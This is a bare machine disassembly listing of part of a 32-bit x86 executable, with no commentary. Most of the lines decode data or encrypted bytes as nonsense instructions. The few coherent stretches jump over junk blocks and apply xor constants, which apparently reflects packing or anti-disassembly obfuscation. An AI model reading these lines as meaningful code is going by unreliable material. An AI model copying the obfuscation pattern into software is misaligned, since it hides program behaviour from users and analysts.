  40a7eb:	call   DWORD PTR ds:0x42ecd0
  40a7f1:	cmp    DWORD PTR ds:0x43059e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43059e
  40a803:	inc    eax
  40a804:	mov    ds:0x43059e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x4305d2
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x4305d6
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a80e
  40a840:	xchg   edi,eax
  40a841:	(bad)  
  40a842:	fst    DWORD PTR ds:0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a89b
  40a84c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a84d:	push   esi
  40a84e:	adc    ebp,DWORD PTR [ecx+0x1c]
  40a851:	pop    es
  40a852:	mov    cl,0xad
  40a854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a855:	inc    ecx
  40a856:	cmp    ah,bl
  40a858:	mov    eax,0x10810222
  40a85d:	pop    edx
  40a85e:	in     eax,0x99
  40a860:	outs   dx,DWORD PTR ds:[esi]
  40a861:	dec    ebx
  40a862:	sbb    ecx,DWORD PTR [ecx+eax*4+0x4c]
  40a866:	push   esi
  40a867:	rcr    bh,1
  40a869:	mov    esi,0x2187878d
  40a86e:	out    dx,al
  40a86f:	jns    0x40a8c2
  40a871:	cmp    eax,0xd37ebb4e
  40a876:	xchg   edi,eax
  40a877:	mov    ds,edi
  40a879:	sub    al,0xff
  40a87b:	add    al,0x43
  40a87d:	(bad)  
  40a87e:	mov    edx,0x17b95e59
  40a883:	inc    esi
  40a884:	ss adc al,0xf
  40a887:	(bad)  
  40a888:	cmp    edx,DWORD PTR [eax+0x61]
  40a88b:	pop    eax
  40a88c:	sbb    DWORD PTR [esi],edx
  40a88e:	pop    ebx
  40a88f:	and    eax,DWORD PTR [eax+ebp*2+0x16]
  40a893:	(bad)  
  40a894:	sbb    bh,BYTE PTR [edi-0x77]
  40a897:	adc    ch,BYTE PTR [ebp+0x4]
  40a89a:	push   edi
  40a89b:	scas   eax,DWORD PTR es:[edi]
  40a89c:	or     eax,0x4fda8136
  40a8a1:	jae    0x40a86d
  40a8a3:	jmp    0xbd0c:0xae290b97
  40a8aa:	mov    dl,0x58
  40a8ac:	mov    ds:0x78046fb8,eax
  40a8b1:	nop
  40a8b2:	mov    dh,0xa1
  40a8b4:	add    al,0x2f
  40a8b6:	push   ebp
  40a8b7:	ss push ds
  40a8b9:	sti    
  40a8ba:	jle    0x40a850
  40a8bc:	icebp  
  40a8bd:	pop    ecx
  40a8be:	pop    es
  40a8bf:	dec    edx
  40a8c0:	mov    esi,0x8baf419e
  40a8c5:	fstp   st(2)
  40a8c7:	ins    BYTE PTR es:[edi],dx
  40a8c8:	out    dx,al
  40a8c9:	jge    0x40a8d9
  40a8cb:	cdq    
  40a8cc:	hlt    
  40a8cd:	inc    eax
  40a8ce:	add    ch,dh
  40a8d0:	push   ebp
  40a8d1:	xor    ax,0xd6fa
  40a8d5:	jmp    0x40a88e
  40a8d7:	ficomp DWORD PTR [esi+0x4c]
  40a8da:	(bad)  
  40a8db:	test   DWORD PTR [esp+esi*2+0x6fc54a7],0xbc1b75a6
  40a8e6:	sub    dl,BYTE PTR [edx+0x2e]
  40a8e9:	(bad)  
  40a8eb:	int3   
  40a8ec:	cmp    ecx,edx
  40a8ee:	jae    0x40a890
  40a8f0:	push   0x2f9e158e
  40a8f5:	mov    al,es:0x23bfbdd7
  40a8fb:	sub    DWORD PTR [ebx],esi
  40a8fd:	cmc    
  40a8fe:	xor    al,0xe5
  40a900:	push   edi
  40a901:	push   cs
  40a902:	pop    ss
  40a903:	inc    ebx
  40a904:	addr16 pop esi
  40a906:	xchg   ecx,eax
  40a907:	call   0x478c396
  40a90c:	sub    esp,ebp
  40a90e:	sub    dx,WORD PTR ss:[edx+0x288c0c07]
  40a916:	fwait
  40a917:	jbe    0x40a89c
  40a919:	push   esi
  40a91a:	das    
  40a91b:	in     eax,0x56
  40a91d:	push   edx
  40a91e:	mov    bh,0xa
  40a920:	cdq    
  40a921:	add    al,BYTE PTR [ecx+0x706c998a]
  40a927:	jbe    0x40a8fa
  40a929:	outs   dx,BYTE PTR ds:[esi]
  40a92a:	hlt    
  40a92b:	sub    eax,0xa9a51fd9
  40a930:	jmp    0x841b:0x358d3dcb
  40a937:	or     ah,dl
  40a939:	pusha  
  40a93a:	inc    ebx
  40a93b:	mov    cl,0x77
  40a93d:	lods   al,BYTE PTR ds:[esi]
  40a93e:	js     0x40a958
  40a940:	dec    edx
  40a941:	sbb    eax,0x7e261f80
  40a946:	(bad)  
  40a947:	or     eax,0x55466238
  40a94c:	rcr    DWORD PTR [ecx+0x5c],cl
  40a94f:	in     al,0x67
  40a951:	inc    esp
  40a952:	pop    edi
  40a953:	sti    
  40a954:	imul   edx,DWORD PTR [ecx-0x786b36db],0x39a5a2e
  40a95e:	fild   DWORD PTR [edi+0xc45756e]
  40a964:	jle    0x40a988
  40a966:	cld    
  40a967:	jmp    0x9b1b:0xb48a7363
  40a96e:	dec    ecx
  40a96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a970:	icebp  
  40a971:	out    dx,al
  40a972:	mov    bh,0x9b
  40a974:	xor    BYTE PTR [esi+0x26],dl
  40a977:	jo     0x40a90e
  40a979:	leave  
  40a97a:	and    eax,esi
  40a97c:	std    
  40a97d:	xor    BYTE PTR [edx],dl
  40a97f:	jge    0x40a982
  40a981:	mov    ebp,0x87087d77
  40a986:	pushf  
  40a987:	sbb    DWORD PTR [di],esi
  40a98a:	sbb    DWORD PTR ds:0xc307e405,esi
  40a990:	sub    eax,0xd7abe539
  40a995:	mov    edi,0x212b30b1
  40a99a:	fs leave 
  40a99c:	es jb  0x40a9ca
  40a99f:	out    dx,eax
  40a9a0:	psllq  mm7,QWORD PTR ds:0x6c70c174
  40a9a7:	jle    0x40aa1e
  40a9a9:	iret   
  40a9aa:	rcl    BYTE PTR [ebp-0x3da3ac10],0xf9
  40a9b1:	aas    
  40a9b2:	fs or  al,ah
  40a9b5:	xchg   edi,eax
  40a9b6:	popa   
  40a9b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9b8:	adc    DWORD PTR [edx],esp
  40a9ba:	(bad)  
  40a9bc:	sub    edi,eax
  40a9be:	xor    dl,ch
  40a9c0:	mov    ebx,0x70f8a27c
  40a9c5:	xchg   ebx,eax
  40a9c6:	ins    BYTE PTR es:[edi],dx
  40a9c7:	pop    ecx
  40a9c8:	jg     0x40a9be
  40a9ca:	cmp    ecx,DWORD PTR [eax]
  40a9cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9cd:	fadd   DWORD PTR [ebx]
  40a9cf:	icebp  
  40a9d0:	sub    eax,0x3b95e750
  40a9d5:	adc    al,dl
  40a9d7:	pop    eax
  40a9d8:	mov    al,ds:0x83a475
  40a9dd:	addr16 fs sbb al,0x9f
  40a9e1:	cs inc edx
  40a9e3:	ja     0x40aa0e
  40a9e5:	shld   esi,esp,0xc3
  40a9e9:	rol    edx,1
  40a9eb:	jae    0x40a9ac
  40a9ed:	pop    ds
  40a9ee:	add    ecx,DWORD PTR [edx-0x3c7a0ede]
  40a9f4:	mov    ecx,0xb5dacaad
  40a9f9:	or     DWORD PTR [ebx-0x6b],eax
  40a9fc:	dec    ecx
  40a9fd:	dec    edx
  40a9fe:	mov    dh,0x23
  40aa00:	inc    ebx
  40aa01:	dec    esi
  40aa02:	adc    edi,ebp
  40aa04:	fadd   DWORD PTR [eax]
  40aa06:	out    dx,al
  40aa07:	and    esp,DWORD PTR [ebx+0x6a]
  40aa0a:	sub    DWORD PTR [ecx+0x691461ee],0x1f
  40aa11:	sub    eax,0xf663023a
  40aa16:	imul   edi,DWORD PTR [esi-0x31],0x25
  40aa1a:	fist   DWORD PTR [esi-0x23]
  40aa1d:	add    ecx,eax
  40aa1f:	int3   
  40aa20:	pop    ds
  40aa21:	sbb    edx,DWORD PTR [ecx+0x56]
  40aa24:	sbb    BYTE PTR [edx-0x3881f85a],0x45
  40aa2b:	cld    
  40aa2c:	xor    al,BYTE PTR [ebp-0x2ef40764]
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e862,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x43065a,0x42e862
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e85a,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x430656,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	push   cs
  40aa9e:	inc    esi
  40aa9f:	nop
  40aaa0:	pop    edi
  40aaa1:	jae    0x40aa90
  40aaa3:	jle    0x40ab23
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aa82
  40aaaa:	cmp    bh,cl
  40aaac:	je     0x40aa36
  40aaae:	div    DWORD PTR [eax-0x68498fe7]
  40aab4:	jnp    0x40aa40
  40aab6:	or     bh,BYTE PTR [ecx+edx*4+0x4da093bb]
  40aabd:	sbb    BYTE PTR [eax+0x71],bl
  40aac0:	mov    ecx,0x909db6fc
  40aac5:	inc    ebx
  40aac7:	iret   
  40aac8:	mov    ds:0xf16d609d,eax
  40aacd:	out    0x89,al
  40aacf:	jp     0x40aab8
  40aad1:	bound  ebx,QWORD PTR [eax+0x43]
  40aad4:	arpl   bx,ax
  40aad6:	lock mov ch,0xd0
  40aad9:	clc    
  40aada:	push   cs
  40aadb:	jp     0x40ab44
  40aadd:	test   esi,edx
  40aadf:	add    al,0xf7
  40aae1:	push   eax
  40aae2:	popa   
  40aae3:	fst    DWORD PTR [ecx]
  40aae5:	cmp    eax,DWORD PTR [ebx+0x44]
  40aae8:	pop    fs
  40aaea:	cmp    al,0x2
  40aaec:	or     DWORD PTR [esi-0x3c],ecx
  40aaef:	rcr    edi,1
  40aaf1:	cmp    DWORD PTR [ebx+0x6d28824],edx
  40aaf7:	dec    esp
  40aaf8:	orps   xmm2,XMMWORD PTR [ecx]
  40aafb:	sbb    BYTE PTR [edx+0x8],bl
  40aafe:	fild   DWORD PTR [ecx+0x62]
  40ab01:	add    ecx,DWORD PTR [eax+0x76188551]
  40ab07:	push   0x74e5755b
  40ab0c:	push   ss
  40ab0d:	mov    dl,0x2c
  40ab0f:	(bad)  
  40ab10:	cmc    
  40ab11:	leave  
  40ab12:	(bad)  
  40ab13:	fld    DWORD PTR [edi]
  40ab15:	mov    ds:0x1b536d37,eax
  40ab1a:	cld    
  40ab1b:	adc    DWORD PTR [eax-0x5e1719f2],eax
  40ab21:	jno    0x40aacc
  40ab23:	jmp    0x76dc:0x709c4ff5
  40ab2a:	iret   
  40ab2b:	jg     0x40aba0
  40ab2d:	adc    al,0x1c
  40ab2f:	in     al,dx
  40ab30:	jnp    0x40ab13
  40ab32:	mov    eax,0xbb315c8d
  40ab37:	pushf  
  40ab38:	add    ebx,DWORD PTR ds:0xd1d268b8
  40ab3e:	and    dh,BYTE PTR [ebx-0x1dc42590]
  40ab44:	xlat   BYTE PTR ds:[ebx]
  40ab45:	frstor [eax+0x15ecdf2f]
  40ab4b:	hlt    
  40ab4c:	sti    
  40ab4d:	sbb    edi,DWORD PTR [esi+0x4e2888e0]
  40ab53:	ror    DWORD PTR [edi-0x529267a8],0x5
  40ab5a:	xor    eax,0x738f11cc
  40ab5f:	xlat   BYTE PTR ds:[ebx]
  40ab60:	in     al,0x13
  40ab62:	dec    eax
  40ab63:	jno    0x40ab4f
  40ab65:	cs pop ebp
  40ab67:	push   ss
  40ab68:	out    0x65,eax
  40ab6a:	jns    0x40abe4
  40ab6c:	cmp    BYTE PTR [edx-0x50],al
  40ab6f:	rcr    DWORD PTR [edx+esi*2-0x6fc24f1c],cl
  40ab76:	xor    edx,DWORD PTR [edx]
  40ab78:	push   0x1832f8fa
  40ab7d:	daa    
  40ab7e:	aaa    
  40ab7f:	push   0x44f2dcb9
  40ab84:	push   ecx
  40ab85:	fcmovne st,st(0)
  40ab87:	jp     0x40ab54
  40ab89:	ja     0x40abea
  40ab8b:	inc    ebx
  40ab8c:	repz pusha 
  40ab8e:	or     eax,0x98710633
  40ab93:	or     DWORD PTR [edi-0x9],0xaf9f371
  40ab9a:	xchg   esi,eax
  40ab9b:	dec    edi
  40ab9c:	ds push esi
  40ab9e:	sbb    BYTE PTR [esi],bh
  40aba0:	mov    DWORD PTR [eax+0x55],ebx
  40aba3:	sbb    ah,BYTE PTR [esi-0x5738e1c7]
  40aba9:	mov    bl,0xaf
  40abab:	pop    esp
  40abac:	bound  eax,QWORD PTR [ebp-0x7980da0e]
  40abb2:	les    ebp,FWORD PTR [ecx-0x6f]
  40abb5:	push   esp
  40abb6:	pop    ds
  40abb7:	cdq    
  40abb8:	jp     0x40ab59
  40abba:	aam    0x5c
  40abbc:	out    dx,al
  40abbd:	mov    eax,0x81e088a6
  40abc3:	add    DWORD PTR [ebx+0x2a55772a],esp
  40abc9:	mov    eax,0x318012f3
  40abce:	push   ebx
  40abcf:	stos   BYTE PTR es:[edi],al
  40abd0:	push   eax
  40abd1:	mov    ch,0xeb
  40abd3:	outs   dx,BYTE PTR ds:[esi]
  40abd4:	test   al,0x8b
  40abd6:	sbb    ebp,DWORD PTR ds:0x68c55b6f
  40abdc:	test   DWORD PTR [ecx+0x66],edx
  40abdf:	into   
  40abe0:	adc    DWORD PTR [edi+eax*2-0x5c],edx
  40abe4:	mov    ds:0xe52b65e,eax
  40abe9:	jg     0x40abc0
  40abeb:	dec    ebp
  40abec:	sub    DWORD PTR [edx],ebp
  40abee:	jb     0x40ab92
  40abf0:	adc    al,0xc7
  40abf2:	iret   
  40abf3:	scas   eax,DWORD PTR es:[edi]
  40abf4:	jo     0x40abab
  40abf6:	cwde   
  40abf7:	dec    ecx
  40abf8:	jae    0x40abf4
  40abfa:	ret    
  40abfb:	and    ecx,ebp
  40abfd:	cmp    bh,dh
  40abff:	pushf  
  40ac00:	scas   al,BYTE PTR es:[edi]
  40ac01:	mov    ch,0xdc
  40ac03:	push   cs
  40ac04:	or     eax,0x7d7c44f8
  40ac09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac0a:	xor    ah,al
  40ac0c:	pop    esi
  40ac0d:	xchg   esp,eax
  40ac0e:	test   eax,0x2dc849aa
  40ac13:	pusha  
  40ac14:	mov    al,ds:0x358c733f
  40ac19:	cmp    dl,BYTE PTR [edi+eax*4-0x39]
  40ac1d:	mov    cl,0x2c
  40ac1f:	stos   BYTE PTR es:[edi],al
  40ac20:	mov    bh,0xe6
  40ac22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac23:	mov    eax,ds:0xeac6bafa
  40ac28:	xchg   esp,eax
  40ac29:	fwait
  40ac2a:	xchg   DWORD PTR [esi+0x73],edx
  40ac2d:	dec    esp
  40ac2e:	mov    BYTE PTR [ecx+edi*4],bl
  40ac31:	fwait
  40ac32:	dec    esp
  40ac33:	push   0xffffffa5
  40ac35:	lea    edi,ds:0x14ad9ead
  40ac3b:	daa    
  40ac3c:	pop    edx
  40ac3d:	mov    bl,0xd3
  40ac3f:	mov    DWORD PTR ss:[eax+0x1f],esi
  40ac43:	outs   dx,BYTE PTR ds:[esi]
  40ac44:	es shl bl,1
  40ac47:	add    al,0xdd
  40ac49:	cmp    al,0xed
  40ac4b:	repnz int3 
  40ac4d:	or     eax,0xcf5c6636
  40ac52:	dec    edx
  40ac53:	call   0x4dba:0x78b6accd
  40ac5a:	xor    DWORD PTR [edx-0x1a],0xffffff94
  40ac5e:	sbb    BYTE PTR [edi+edi*1-0x1c],0xd7
  40ac63:	or     DWORD PTR [eax*8-0x776e8a31],esi
  40ac6a:	mov    dh,0x9b
  40ac6c:	and    bl,BYTE PTR [edx-0x33]
  40ac6f:	or     ch,BYTE PTR [ebx]
  40ac71:	add    ch,BYTE PTR [eax]
  40ac73:	retf   0x9b29
  40ac76:	je     0x40acc0
  40ac78:	rcr    ch,0xc8
  40ac7b:	cmc    
  40ac7c:	add    DWORD PTR [esi+edx*2],ecx
  40ac7f:	leave  
  40ac80:	jp     0x40acb6
  40ac82:	dec    ecx
  40ac83:	retf   0xe2ea
  40ac86:	pop    ecx
  40ac87:	xor    eax,edx
  40ac89:	xor    esi,edx
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0x2a5eee02
  40aca1:	repnz push ecx
  40aca3:	out    dx,al
  40aca4:	jle    0x40ad24
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40ac8f
  40acab:	cmp    eax,0x842d7e3d
  40acb0:	inc    edx
  40acb1:	sar    DWORD PTR [esi+0x254df098],0x7a
  40acb8:	test   eax,ecx
  40acba:	inc    ecx
  40acbb:	gs and esi,DWORD PTR ds:[ebp-0x5ac5b1d2]
  40acc3:	fstp   DWORD PTR [eax+edx*2-0x1c8fe0af]
  40acca:	test   al,0x4a
  40accc:	fcmovnb st,st(7)
  40acce:	in     eax,0x2d
  40acd0:	shr    DWORD PTR [ebx+ebp*2],0x81
  40acd4:	push   ebp
  40acd5:	xor    al,0x1c
  40acd7:	pop    esi
  40acd8:	(bad)  
  40acd9:	sbb    BYTE PTR [edi-0xd57f0ce],ah
  40acdf:	mov    bl,0x36
  40ace1:	scas   al,BYTE PTR es:[edi]
  40ace2:	rol    BYTE PTR [ecx],1
  40ace4:	les    eax,FWORD PTR [ebx-0x3a]
  40ace7:	sahf   
  40ace8:	sub    edi,DWORD PTR [edi-0x33d1ce4c]
  40acee:	fist   DWORD PTR [eax-0xf]
  40acf1:	js     0x40acfe
  40acf3:	add    BYTE PTR [edi],0xdb
  40acf6:	mov    ?,WORD PTR [edx+0x576c6166]
  40acfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acfd:	sbb    al,0xfb
  40acff:	stc    
  40ad00:	enter  0x14be,0x75
  40ad04:	jo     0x40acac
  40ad06:	(bad)  
  40ad07:	lock js 0x40ad21
  40ad0a:	pop    ebx
  40ad0b:	hlt    
  40ad0c:	sahf   
  40ad0d:	std    
  40ad0e:	retf   0xb110
  40ad11:	cmp    al,0x5
  40ad13:	jbe    0x40ace0
  40ad15:	add    al,BYTE PTR [ebx+0x1f]
  40ad18:	push   edx
  40ad19:	sar    DWORD PTR [edx-0x30],0xa9
  40ad1d:	(bad)  
  40ad1e:	js     0x40acc8
  40ad20:	in     al,0x4b
  40ad22:	fst    QWORD PTR [edx+0x7897015]
  40ad28:	arpl   WORD PTR [esp+edi*4-0x5dedf711],sp
  40ad2f:	push   0x7c62c0f6
  40ad34:	push   edx
  40ad35:	or     eax,0x8d2068c
  40ad3a:	xchg   ebp,eax
  40ad3b:	test   eax,0x933005e5
  40ad40:	lock xchg BYTE PTR [ebp+0x34],ah
  40ad44:	or     DWORD PTR [ecx-0x4e],eax
  40ad47:	and    esp,esp
  40ad49:	mov    dl,0x86
  40ad4b:	sub    cl,BYTE PTR ds:[ebp-0x68bd0499]
  40ad52:	cmp    DWORD PTR [esi+edi*2],esp
  40ad55:	push   0x26428fb2
  40ad5a:	push   cs
  40ad5b:	imul   ebx,DWORD PTR [edi],0xd1f8f9f3
  40ad61:	test   eax,0x279e7b8e
  40ad66:	ds xchg esp,eax
  40ad68:	mov    eax,ds:0xb7c5eea3
  40ad6d:	or     esi,DWORD PTR [eax]
  40ad6f:	and    DWORD PTR [edi+0x6f],ebp
  40ad72:	inc    esi
  40ad73:	bnd jo 0x40ad25
  40ad76:	adc    ecx,DWORD PTR [eax]
  40ad78:	test   ebp,ecx
  40ad7a:	jns    0x40ad82
  40ad7c:	xor    BYTE PTR [edx+0x4c0358c1],ch
  40ad82:	pop    eax
  40ad83:	hlt    
  40ad84:	dec    edi
  40ad85:	xor    eax,0x6d6d7ea3
  40ad8a:	inc    esi
  40ad8b:	int    0xc6
  40ad8d:	and    DWORD PTR [edi+ebx*8],0x7fa6cbd9
  40ad94:	or     eax,0x36ff800c
  40ad99:	or     DWORD PTR [ebp+0x5f],edi
  40ad9c:	mov    eax,eax
  40ad9e:	out    dx,eax
  40ad9f:	clc    
  40ada0:	pop    esp
  40ada1:	pop    edx
  40ada2:	cmp    al,0xc5
  40ada4:	mov    al,ds:0xdf4e6593
  40ada9:	xor    al,0x8d
  40adab:	idiv   BYTE PTR [edx]
  40adad:	mov    ch,0xb7
  40adaf:	pusha  
  40adb0:	pop    ds
  40adb1:	fcomp  QWORD PTR [edx]
  40adb3:	and    eax,0x486102e7
  40adb8:	inc    edi
  40adb9:	shl    BYTE PTR [ebx-0x683512c9],1
  40adbf:	inc    ebx
  40adc0:	inc    ecx
  40adc1:	jnp    0x40adab
  40adc3:	jne    0x40ad4c
  40adc5:	ins    DWORD PTR es:[edi],dx
  40adc6:	sub    eax,0x613ee8f9
  40adcb:	aam    0x7c
  40adcd:	dec    edi
  40adce:	(bad)  
  40adcf:	push   esi
  40add0:	cdq    
  40add1:	mov    DWORD PTR [edx+0x3070b828],ecx
  40add7:	nop
  40add8:	and    BYTE PTR [esi+eax*2],ah
  40addb:	fidivr WORD PTR [edi-0x189b1a9e]
  40ade1:	or     ah,BYTE PTR [edi+ebp*8]
  40ade4:	and    al,0x1e
  40ade6:	loopne 0x40adc3
  40ade8:	xchg   ebp,eax
  40ade9:	cs aam 0xb1
  40adec:	adc    DWORD PTR [edi+0x4],0x9213c13
  40adf3:	fwait
  40adf4:	out    0x4a,al
  40adf6:	jle    0x40ae4b
  40adf8:	mov    ah,0x4d
  40adfa:	shr    BYTE PTR [ebx+ecx*2-0x7a49f27c],0x33
  40ae02:	and    eax,0x4d6ae235
  40ae07:	fwait
  40ae08:	std    
  40ae09:	add    DWORD PTR [eax+0x7],esi
  40ae0c:	push   ds
  40ae0d:	mov    bl,0x2b
  40ae0f:	out    dx,eax
  40ae10:	faddp  st(6),st
  40ae12:	jae    0x40ae81
  40ae14:	inc    eax
  40ae15:	pop    es
  40ae16:	das    
  40ae17:	jns    0x40addb
  40ae19:	xchg   edx,eax
  40ae1a:	in     al,0xc7
  40ae1c:	rol    DWORD PTR [eax-0x41],1
  40ae1f:	imul   ebp,DWORD PTR [eax-0x7ab6978a],0xffffffd3
  40ae26:	repnz cli 
  40ae28:	ud2    
  40ae2a:	in     al,0x11
  40ae2c:	push   cs
  40ae2d:	aaa    
  40ae2e:	jle    0x40adde
  40ae30:	mov    al,ds:0x68f3d6b6
  40ae35:	push   ss
  40ae36:	sub    DWORD PTR [edi+0x0],0x1e2f584d
  40ae3d:	and    esi,DWORD PTR [ebp+0x26]
  40ae40:	std    
  40ae41:	in     al,dx
  40ae42:	std    
  40ae43:	popa   
  40ae44:	outs   dx,DWORD PTR ds:[esi]
  40ae45:	sbb    edi,0xffffffa8
  40ae48:	lea    esp,[ebp+0x1cc8e181]
  40ae4e:	aaa    
  40ae4f:	repz je 0x40ae8b
  40ae52:	mov    eax,0x56b822e4
  40ae57:	jae    0x40adda
  40ae59:	push   ecx
  40ae5a:	dec    edi
  40ae5b:	mov    ah,0xad
  40ae5d:	sub    eax,0x3671e2be
  40ae62:	pop    eax
  40ae63:	push   edi
  40ae64:	sbb    eax,0xe7f28ae0
  40ae69:	adc    al,0x4f
  40ae6b:	push   ds
  40ae6c:	inc    esp
  40ae6d:	or     eax,0x29b17f75
  40ae72:	test   DWORD PTR es:[edi-0x77],eax
  40ae76:	add    BYTE PTR [ecx],bl
  40ae78:	imul   esi
  40ae7a:	mov    al,ds:0xf58ced46
  40ae7f:	or     esp,DWORD PTR [ecx+0x7cfc52ee]
  40ae85:	(bad)  
  40ae86:	fwait
  40ae87:	mov    bh,0x3
  40ae89:	icebp  
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock bound edx,QWORD PTR [esi]
  40aeb4:	pop    ds
  40aeb5:	jle    0x40ae76
  40aeb7:	loopne 0x40af37
  40aeb9:	jle    0x40af17
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40af3e
  40aebf:	push   edi
  40aec0:	push   ds
  40aec1:	imul   ebx,DWORD PTR [ebx+ebp*1+0x3b],0x5a
  40aec6:	enter  0x5471,0x46
  40aeca:	(bad)  
  40aecc:	push   cs
  40aecd:	push   cs
  40aece:	jae    0x40ae5e
  40aed0:	jle    0x40ae90
  40aed2:	nop
  40aed3:	shl    BYTE PTR [edx-0x72e660cd],cl
  40aed9:	pop    esi
  40aeda:	mov    ch,0xe5
  40aedc:	mov    ah,0xc0
  40aede:	iret   
  40aedf:	jmp    0x40aed9
  40aee1:	cs dec eax
  40aee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aee4:	test   al,0xb
  40aee6:	enter  0x2a93,0x7e
  40aeea:	push   ebx
  40aeeb:	lods   eax,DWORD PTR ds:[esi]
  40aeec:	or     eax,eax
  40aeee:	jb     0x40ae8d
  40aef0:	sti    
  40aef1:	xchg   ebx,eax
  40aef2:	and    DWORD PTR [eax],0xfab99711
  40aef8:	xchg   BYTE PTR [ebx],dh
  40aefa:	dec    esi
  40aefb:	cld    
  40aefc:	jno    0x40aea4
  40aefe:	mov    cl,0xac
  40af00:	leave  
  40af01:	out    0xd0,al
  40af03:	lods   al,BYTE PTR ds:[esi]
  40af04:	sub    al,0xd2
  40af06:	mov    ch,0xf0
  40af08:	ja     0x40af83
  40af0a:	and    eax,0x38b37ea1
  40af0f:	mov    eax,0x90537837
  40af14:	sub    al,0xb9
  40af16:	test   eax,0x7c92b0bb
  40af1b:	mov    ds:0x58a466d5,eax
  40af20:	les    ebx,FWORD PTR [ecx-0x18]
  40af23:	repz mov edi,0xa474199a
  40af29:	jmp    0x7df0e26d
  40af2e:	sub    edx,ecx
  40af30:	(bad)  
  40af31:	jecxz  0x40af7c
  40af33:	outs   dx,DWORD PTR ds:[esi]
  40af34:	fisttp WORD PTR [edx-0x9]
  40af37:	cdq    
  40af38:	push   es
  40af39:	fisubr WORD PTR [edx+0x0]
  40af3c:	jmp    0x751e060c
  40af41:	rol    DWORD PTR [ebx+eax*4+0x22bdd4f0],1
  40af48:	cmp    al,0xa7
  40af4a:	(bad)  [eax+0x6d]
  40af4d:	xchg   esi,eax
  40af4e:	rcr    DWORD PTR [ebp-0x75956322],0x92
  40af55:	daa    
  40af56:	inc    ebp
  40af57:	jb     0x40afd0
  40af59:	outs   dx,DWORD PTR ds:[esi]
  40af5a:	inc    edi
  40af5b:	dec    eax
  40af5c:	(bad)  
  40af5e:	or     ebp,esp
  40af60:	jbe    0x40af60
  40af62:	test   BYTE PTR [edi-0x27],dh
  40af65:	and    DWORD PTR [ecx],esi
  40af67:	(bad)  
  40af68:	cmp    edx,ebx
  40af6a:	call   0x5773:0x28e316ee
  40af71:	mov    ebp,0x56e2f644
  40af76:	fsub   st(6),st
  40af78:	push   eax
  40af79:	test   esp,edx
  40af7b:	mov    cl,0x9a
  40af7d:	adc    bh,BYTE PTR [ebx+ebx*2+0xd]
  40af81:	dec    ebx
  40af82:	pop    si
  40af84:	inc    esp
  40af85:	int3   
  40af86:	xchg   ebx,eax
  40af87:	push   0x1c
  40af89:	dec    ebp
  40af8a:	ds sub al,0x10
  40af8d:	imul   ch
  40af8f:	add    edx,DWORD PTR [ecx+0x1f3f659e]
  40af95:	adc    ch,0x51
  40af98:	test   eax,0x95de8172
  40af9d:	inc    ebp
  40af9e:	lea    ecx,fs:[esi+0x5b]
  40afa2:	cmp    bl,dl
  40afa4:	push   eax
  40afa5:	mov    dl,0x4a
  40afa7:	das    
  40afa8:	push   edx
